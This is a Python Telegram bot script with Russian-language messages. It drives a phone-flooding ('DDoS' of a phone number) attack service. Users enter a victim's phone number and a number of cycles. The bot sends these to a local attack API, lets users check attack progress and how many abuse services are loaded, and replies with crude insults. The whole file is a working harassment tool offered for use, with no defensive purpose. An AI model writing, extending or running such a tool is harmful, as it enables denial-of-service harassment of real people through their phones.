import telebot
import requests

bot = telebot.TeleBot('TOKEN')
tel = ''
count = ''
id = ''

bot.send_message(201743325, "Готов к разъёбу")

@bot.message_handler(content_types=['text'])
def start(message):
    global id
    if message.text == '/start':
        bot.send_message(message.from_user.id, "Номер для дудоса")
        bot.register_next_step_handler(message, get_tel)
    elif message.text == '/status':
        try:
            response = requests.get(
                f"http://127.0.0.1:8080/attack/{id}/status", params={"country_code": 7}
            ).json()
            # print(f"{response['currently_at']}/{response['end_at']}")
            bot.send_message(message.from_user.id, f"{response['currently_at']}/{response['end_at']}")
        except BaseException:
            bot.send_message(message.from_user.id, f"Упал сервер или не было последней записи")
    elif message.text == '/status_server':
        try:
            response = requests.get(
                "http://127.0.0.1:8080/services/count", params={"country_code": 7}
            ).json()
            bot.send_message(message.from_user.id, "Сервер готов. Заряжено "+str(response["count"])+" сервисов")
        except BaseException:
                bot.send_message(message.from_user.id, f"Сервак лежит")
    else:
        bot.send_message(message.from_user.id, "Пососи и пиши /start")


def get_tel(message):
    global tel
    tel = message.text
    bot.send_message(message.from_user.id, 'Количество циклов')
    bot.register_next_step_handler(message, get_count)

def get_count(message):
    global tel
    global count
    global id
    count = message.text
    bot.send_message(message.from_user.id, ''+count+' циклов на номер '+tel+' ')
    response = requests.post(
        "http://127.0.0.1:8080/attack/start",
        json={"number_of_cycles": count, "phone": tel},
    ).json()
    if response["success"]:
        id = response["id"]  # 94bf6f8f0da04a73bc229b09ba6eec98
        bot.send_message(message.from_user.id, 'В процессе. Статус по текущей можно отследить тут /status')
    else:
        print("Проблемка")


bot.polling(none_stop=True, interval=0)
